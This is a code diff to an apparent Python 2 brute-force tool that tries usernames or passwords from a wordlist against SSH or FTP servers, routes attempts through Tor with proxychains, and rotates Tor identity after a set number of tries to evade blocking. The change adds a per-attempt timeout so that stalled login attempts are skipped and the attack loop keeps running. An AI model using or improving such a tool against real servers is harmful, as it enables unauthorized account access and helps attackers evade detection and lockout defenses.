@@ -75,6 +75,7 @@ def argvcontrol():
 	parser.add_argument("-p","--port", help="Destination port", default="22")
 	parser.add_argument("-a","--attempts", help="Number of attempts before identity change", default="3")
 	parser.add_argument("-w","--wait", help="Waiting time after Tor service restart (in seconds)", default="1")
+	parser.add_argument("-o","--timeout", help="Timeout for each attempt (in seconds)", default="30")
 	parser.add_argument("-s","--service", help="The targeted service: ssh, ftp", default='ssh')
 	parser.add_argument("-t","--test", help="Use the to test dependences", action='store_true', default=False)
 	args = parser.parse_args()
@@ -104,11 +105,31 @@ def argvcontrol():
 	if not positiveNumberValidation(args.wait):
 		print "[!] Wait time invalid"
 		valid = False
+	if not positiveNumberValidation(args.timeout):
+		print "[!] Timeout invalid"
+		valid = False
 	if args.service != "ssh" and args.service != "ftp":
 		print "[!] Invalid service, choose between: ssh, ftp"
 		valid = False
 
 	return valid, args
+
+def wait_timeout(proc, seconds):
+	"""
+	Wait for a process to finish, or raise exception after timeout
+	"""
+	start = time.time()
+	end = start + seconds
+	interval = min(seconds / 1000.0, .25)
+
+	while True:
+		result = proc.poll()
+		if result is not None:
+			return result
+		if time.time() >= end:
+			raise RuntimeError("Process timed out")
+		time.sleep(interval)
+
 
 def main():
 
@@ -130,6 +151,7 @@ def main():
 			wordlist = check[1].wordlist
 			attempts = int(check[1].attempts)
 			wait = int(check[1].wait)
+			timeout = int(check[1].timeout)
 			service = check[1].service
 			user = ""
 			password = ""
@@ -158,7 +180,7 @@ def main():
 					subprocess.call(['proxychains', '-q', 'curl', 'https://ipinfo.io/ip'])
 					print
 
-				print 'We\' re trying with: ' + line
+				print '\nWe\' re trying with: ' + line
 				if bruteforce == "user":
 					user =  line[:-1]
 				elif bruteforce == "pass":
@@ -169,9 +191,16 @@ def main():
 				elif service == "ftp":
 					var = 'proxychains ftp ftp://' + user + ':' + password + '@' + ip
 				var_list = var.split(' ')
-				print '[*] ' + var
-				subprocess.call(var_list)
-				c += 1
+
+				try:
+					print '[*] ' + var
+					subp = subprocess.Popen(var_list)
+					wait_timeout(subp, timeout)
+					print '[!] Returned Status Code: ' + str(subp.returncode)
+					c += 1
+				except RuntimeError:
+					print '\n[*] Process timed out, continuing to next attempt...'
+					continue
 
 	except (KeyboardInterrupt, SystemExit):
 		exit()
